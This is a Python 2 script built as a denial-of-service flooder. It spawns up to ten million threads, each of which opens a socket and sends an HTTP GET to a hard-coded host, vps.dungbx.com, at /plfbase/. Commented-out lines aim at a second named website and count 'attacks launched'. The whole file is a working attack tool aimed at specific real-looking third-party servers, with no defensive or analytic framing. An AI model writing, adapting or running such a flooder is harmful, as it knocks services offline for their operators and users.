import urllib2
import time
import threading
import sys
import time
import socket

start = time.time()
#grabs urls of hosts and prints first 1024 bytes of page
# for host in hosts:
#     url = urllib2.urlopen(host)
#     url.read(1024)
attack = 0;

class dos(threading.Thread):

    def __init__(self, host, port, target):
        self.host = host
        self.port = port
        self.target = target
        threading.Thread.__init__(self)

    def run(self):

        global attack;
        # try:
        #     urllib2.urlopen('http://volamhaokiet.com/')
        #     attack += 1
        #     print "Attacks number was lauched: %d\r" % attack,
        # except Exception, ex:
        #     print "%s\n\r" % ex,
        msg = """GET %(target)s HTTP/1.1\r
Host: %(host)s\r
Uset-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT) Hello Picaso\r
Connection: Keep-Alive""";
    
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.host, self.port))
        print msg % {'target' : self.target, 'host' : self.host}
        self.sock.send(msg % {'target' : self.target, 'host' : self.host})
        response = self.sock.recv(4096)
        print response
        self.sock.close()
try:
    for i in range(10000000):
        test = dos('vps.dungbx.com', 80, '/plfbase/')
        test.start();
    print ""
except KeyboardInterrupt:
    print "\nExiting without waiting!"
    sys.exit(1)
